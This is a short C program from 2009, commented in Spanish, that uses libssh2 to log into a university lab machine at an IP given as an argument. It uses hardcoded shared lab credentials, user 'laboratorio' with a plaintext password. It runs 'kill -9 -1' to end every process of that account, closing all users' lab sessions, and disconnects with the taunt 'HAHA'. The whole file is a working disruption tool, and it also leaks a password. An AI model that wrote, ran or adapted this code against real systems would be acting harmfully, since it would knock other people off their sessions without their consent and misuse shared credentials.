/* 2009 - Astrozator - Cierra las sessiones "laboratorio" de todos.
 */

#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#include <libssh2.h>

#define PORT 22
#define LAB_USER "laboratorio"
#define LAB_PASS "utalca"

int main(int c, char **v)
{
	LIBSSH2_CHANNEL *channel;
	LIBSSH2_SESSION *session;

	int sockfd = socket(PF_INET, SOCK_STREAM, 0);
	struct sockaddr_in so;
	

	if(c < 2)
		return 1;

	so.sin_addr.s_addr = inet_addr(v[1]);
	so.sin_port = htons(PORT);
	so.sin_family = AF_INET;

	if(connect(sockfd, (struct sockaddr *)&so, sizeof(struct sockaddr_in)) == -1) {
		fprintf(stderr, "No es posible conectarse a la maquina %s:22 :(\n", v[1]);
		return EXIT_FAILURE;
	}

	session = libssh2_session_init();
	libssh2_session_startup(session, sockfd);
	libssh2_userauth_password(session, LAB_USER, LAB_PASS);

	channel = libssh2_channel_open_session(session);
	libssh2_channel_exec(channel, "kill -9 -1");

	libssh2_channel_close(channel);
	libssh2_channel_free(channel);

	libssh2_session_disconnect(session, "HAHA");
	libssh2_session_free(session);

	close(sockfd);

	return 0;
}
